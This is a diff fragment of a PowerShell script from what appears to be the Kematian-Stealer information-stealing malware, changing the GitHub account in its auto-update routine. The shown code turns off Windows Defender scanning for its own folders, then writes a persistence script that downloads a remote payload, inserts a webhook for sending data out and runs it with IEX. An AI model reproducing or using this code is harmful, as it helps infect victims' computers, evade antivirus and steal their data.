@@ -40,7 +40,7 @@ function AUTOUPDATE {
 	Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
     $Content = @"
-`$t=(Iwr -Uri "https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/main.ps1" -useb);`$t-replace "YOUR_WEBHOOK_HERE", "AUTOUPDATE WEBHOOK" | IEX
+`$t=(Iwr -Uri "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1" -useb);`$t-replace "YOUR_WEBHOOK_HERE", "AUTOUPDATE WEBHOOK" | IEX
 "@
     [IO.File]::WriteAllText("$env:APPDATA\Kematian\Kematian.ps1", $Content)
 	$KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
